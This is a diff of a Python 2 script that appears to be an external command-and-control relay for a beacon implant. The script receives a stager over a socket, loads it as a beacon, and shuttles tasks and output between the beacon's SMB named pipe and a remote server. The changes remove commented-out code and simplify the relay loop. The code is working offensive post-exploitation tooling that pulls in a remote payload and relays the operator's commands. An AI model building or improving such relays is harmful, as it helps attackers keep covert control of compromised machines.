@@ -48,28 +48,12 @@ def sendData(sock, data):
 
 def recvData(sock):
 	# Need to read the first 4 bytes of the frame to determine size
-	# frameSize = ""
-	# while len(frameSize) != 4:
-	# 	frameSize = sock.recv(4)
-
-	# dataSize = struct.unpack('<I', frameSize)[0]
-	# print "dataSize = " + str(dataSize) # DEBUG
-	# # sock.settimeout(SOCK_TIME_OUT)
-	# newTask = sock.recv(dataSize)
-	# print "newTask = " + str(newTask) #DEBUG
-
-	# decoded_task = decode(newTask)
-	# return decoded_task
-
-	# Going to try a new method of simply reusing the writeframetoc2 logic
-	# ### 5 mins later...
-	# ### This seems to be working...
 	try:
 		chunk = sock.recv(4)
 	except:
 		return("")
-	if len(chunk) < 4: # wtf does this line even do?
-		return() #wtf does this line even do?
+	if len(chunk) < 4: 
+		return() 
 	slen = struct.unpack('<I', chunk)[0]
 	chunk = sock.recv(slen)
 	while len(chunk) < slen:
@@ -113,19 +97,13 @@ def go(sock):
 	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
 	print "Waiting for stager..." # DEBUG
 	p = recvData(sock)
-	# Wait for shellcode
-	# while(len(p) <= 0):
-	# 	print "Next chunk.."
-	# 	sleep(0.3)
-	# 	p = recvData(sock)
 	print "Got a stager! loading..."
 	sleep(2)
 	# print "Decoded stager = " + str(p) # DEBUG
 	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
 	handle_beacon = start_beacon(p)
 
-	# TODO: WE NEED LOGIC TO GET THE METADATA FROM THE SMB PIPE HERE!
-	#  ## I think this is automatically done during interact(), but not entirely sure?
+	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
 	print "Loaded, and got handle to beacon. Getting METADATA."
 
 	return handle_beacon
@@ -141,18 +119,15 @@ def interact(sock, handle_beacon):
 			break
 		else:
 			print "Received %d bytes from pipe" % (len(chunk))
-		if len(chunk) > 1:
-			print "relaying chunk to server"
-			sendData(sock, chunk)
+		print "relaying chunk to server"
+		sendData(sock, chunk)
 
 		# LOGIC TO CHECK FOR A NEW TASK
-		# TODO: This probably has to be rewritten...
 		print "Checking for new tasks from transport"
 		
 		newTask = recvData(sock)
-		if len(newTask) > 0:
-			print "Got new task: %s" % (newTask)
 
+		print "Got new task: %s" % (newTask)
 		print "Writing %s bytes to pipe" % (len(newTask))
 		r = WritePipe(handle_beacon, newTask)
 		print "Write %s bytes to pipe" % (r)
